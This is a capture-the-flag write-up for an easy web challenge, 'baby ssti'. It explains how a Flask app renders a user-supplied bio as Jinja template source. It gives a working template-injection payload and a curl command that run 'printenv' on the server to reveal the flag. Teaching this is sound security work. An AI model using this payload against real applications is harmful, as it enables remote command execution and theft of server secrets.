---
title: "baby ssti"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# baby ssti

## Summary

The profile bio is interpreted by the server-side Jinja template engine. A Jinja expression can run a command and display the FLAG environment variable.

## Root cause

The vulnerable rendering logic is:

~~~python
bio = user[1]
template = PROFILE_TEMPLATE.format(bio=bio)
return render_template_string(template, user=user)
~~~

The first line reads a user-controlled bio, the second places it directly into template source, and the third evaluates that source. This is unsafe because Jinja syntax in the bio becomes server-side code.

## Vulnerability

After updating the bio, Jinja syntax is evaluated instead of shown literally. For example, submitting an expression that multiplies 7 by 7 renders as 49. This confirms server-side template injection, not browser-side JavaScript.

## Exploit

1. Register and log in with any account.
2. Set the bio to:

~~~jinja
{{ cycler.__init__.__globals__.os.popen('printenv').read() }}
~~~

3. Reload the profile page and read the line beginning with FLAG.

The Jinja cycler object is normally available to templates. The payload reaches Python's os module, runs printenv on the server, and inserts the result into the page.

~~~bash
curl -b cookies.txt -X POST https://baby-ssti.web1.friendly-ctf.securinets.tn/profile \
  --data-urlencode "bio={{ cycler.__init__.__globals__.os.popen('printenv').read() }}"
~~~

## Flag

~~~text
Securinets{3asy_serv3r_s1de_templ4te_inj3ct10n}
~~~
